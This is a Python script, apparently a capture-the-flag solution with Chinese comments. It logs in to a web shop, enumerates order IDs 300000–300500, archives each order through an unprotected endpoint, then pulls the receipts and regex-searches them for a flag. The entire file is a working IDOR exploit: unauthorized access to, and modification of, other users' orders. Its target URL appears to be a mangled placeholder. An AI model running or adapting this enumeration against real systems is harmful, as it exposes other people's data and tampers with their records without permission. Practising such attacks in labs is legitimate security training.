import requests
import re

# 配置
BASE_URL = "http://ip32769"
USERNAME = "test"
PASSWORD = "test"


def exploit():
    # 创建会话
    session = requests.Session()

    print("[*] 步骤1: 登录系统")
    # 登录 - 第一步提交用户名
    login_data = {"username": USERNAME}
    response = session.post(f"{BASE_URL}/", data=login_data)
    print(f"[+] 提交用户名,状态码: {response.status_code}")

    # 登录 - 第二步提交密码
    password_data = {"password": PASSWORD}
    response = session.post(f"{BASE_URL}/password/{USERNAME}", data=password_data)
    print(f"[+] 提交密码,状态码: {response.status_code}")

    print("\n[*] 步骤2: 枚举并归档订单")
    # 尝试归档订单ID范围
    archived_orders = []
    for order_id in range(300000, 300501):
        archive_url = f"{BASE_URL}/order/{order_id}/archive"
        response = session.get(archive_url)
        if response.status_code == 200:
            print(f"[+] 成功归档订单 {order_id}")
            archived_orders.append(order_id)
        elif response.status_code == 404:
            # 订单不存在,继续下一个
            continue
        else:
            print(f"[-] 归档订单 {order_id} 失败,状态码: {response.status_code}")

    print(f"\n[+] 共归档 {len(archived_orders)} 个订单")

    print("\n[*] 步骤3: 查看归档订单列表")
    response = session.get(f"{BASE_URL}/orders_archive")
    print(f"[+] 归档列表状态码: {response.status_code}")

    print("\n[*] 步骤4: 尝试获取每个归档订单的收据")
    for target_order_id in archived_orders:
        receipt_url = f"{BASE_URL}/order/{target_order_id}/receipt"
        response = session.get(receipt_url)

        if response.status_code == 200:
            # 直接在响应文本中搜索flag
            content = response.text

            # 方法1: 搜索包含flag关键词的内容
            flag_pattern = r"flag[:\s]*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"
            flag_match = re.search(flag_pattern, content, re.IGNORECASE)

            if flag_match:
                flag = flag_match.group(1)
                print(f"\n[!] FLAG找到 (关键词): {flag}")
                print(f"[+] 来自订单ID: {target_order_id}")
                return flag

            # 方法2: 直接搜索UUID格式
            uuid_pattern = (
                r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
            )
            uuid_match = re.search(uuid_pattern, content, re.IGNORECASE)

            if uuid_match:
                flag = uuid_match.group(0)
                print(f"\n[!] FLAG找到 (UUID): {flag}")
                print(f"[+] 来自订单ID: {target_order_id}")
                return flag

            # 方法3: 搜索 "flag" 关键词附近的内容
            if "flag" in content.lower():
                print(f"[+] 订单 {target_order_id} 包含 'flag' 关键词")
                # 提取flag周围的文本查看
                flag_index = content.lower().index("flag")
                context = content[max(0, flag_index - 50) : flag_index + 150]
                print(f"[+] 上下文: {context}")
            else:
                print(f"[-] 订单 {target_order_id} 中未找到flag")
        else:
            print(
                f"[-] 获取订单 {target_order_id} 收据失败,状态码: {response.status_code}"
            )

    return None


if __name__ == "__main__":
    exploit()
